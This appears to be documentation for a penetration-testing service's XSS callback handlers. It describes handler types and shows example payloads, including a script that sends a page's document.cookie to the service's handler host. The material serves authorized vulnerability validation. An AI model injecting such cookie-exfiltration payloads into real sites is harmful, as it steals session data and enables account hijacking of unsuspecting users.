## Overview

XSS Handlers provide callback endpoints for capturing XSS payload executions, helping you validate and demonstrate XSS vulnerabilities.

## What it does

    Generate a unique handler endpoint.
  </Step>
  <Step title="Craft payload">
    Build an XSS payload using the handler URL.
  </Step>
  <Step title="Inject payload">
    Test the payload in the target application.
  </Step>
  <Step title="Monitor results">
    View callbacks when payloads execute.
  </Step>

## Handler types

| Type | Purpose | Data captured |
|------|---------|---------------|
| Basic | Simple execution proof | Timestamp, source |
| Cookie | Cookie exfiltration | Cookies, headers |
| DOM | DOM data capture | Page content, localStorage |
| Screenshot | Visual capture | Page screenshot |

## Example payloads

### Basic callback

```javascript
<script>new Image().src="https://handler.pentest-tools.com/h/YOUR_ID"</script>
```

### Cookie capture

```javascript
<script>new Image().src="https://handler.pentest-tools.com/h/YOUR_ID?c="+document.cookie</script>
```

## Captured data

For each callback:
- Timestamp
- Source IP
- Cookies (if captured)
- Referer header
- User agent
- Custom parameters

<Warning>
XSS handlers capture real data. Handle captured cookies and session data responsibly and delete after testing.
</Warning>

## Use cases

- Validate reflected XSS
- Prove stored XSS impact
- Demonstrate session hijacking risk
- Document for reports

<Tip>
Use XSS handlers to provide undeniable proof of exploitation in your security reports.
